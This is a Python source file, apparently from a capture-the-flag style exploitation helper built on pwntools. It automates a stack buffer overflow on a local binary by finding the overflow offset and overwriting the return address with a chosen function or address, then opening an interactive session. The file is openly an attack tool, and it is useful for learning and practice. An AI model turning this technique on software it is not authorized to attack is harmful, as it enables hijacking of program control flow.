import argparse
import sys
import pathlib
import os
import pwn

import logger
from binary import Binary

class Overwrite:
    command = "overwrite"

    def __init__(self):
        parser = argparse.ArgumentParser(
            description="Overwrite a return address to access specific part of the binary"
        )

        parser.add_argument(
            "-t",
            "--target",
            type=str,
            help="Function to reach may be function name or address",
        )
        parser.add_argument(
            "binary", nargs="?", type=pathlib.Path, help="Binary to exploit"
        )

        sysargs = sys.argv[2:]
        if len(sysargs) > 0:
            args = parser.parse_args(sys.argv[2:])

            if not args.binary or not args.target:
                logger.error(f'You have to specify a {logger.custom("binary", color="red", style="bold")} and a {logger.custom("target", color="red", style="bold")} to exploit\n')
                parser.print_help()
                sys.exit(1)

            self.binary = Binary(path=args.binary)
            self.target = args.target

            self.main()

        else:
            parser.print_help()

    def parse_target(self):
        address = 0

        if self.target[0:2] == "0x":
            address = int(self.target, 16)
        else:
            address = self.binary.elf.symbols[self.target]

        logger.success(f"Target address is {hex(address)}")
        return address

    def main(self):
        logger.info("Starting exploitation\n")

        target_address = self.parse_target()

        overflow_offset = self.binary.get_overflow_offset()

        if overflow_offset == -1:
            logger.error("No overflow offset found")
            sys.exit(1)

        logger.success(f"Overflow offset found: {overflow_offset}")

        process = pwn.process(self.binary.path)

        process.sendline(
            b"A" * overflow_offset + getattr(pwn, self.binary.packing)(target_address)
        )

        logger.success("\nEXPLOIT SUCCESS\n")

        process.interactive()
        os.remove(process.corefile.path)

        sys.exit(0)
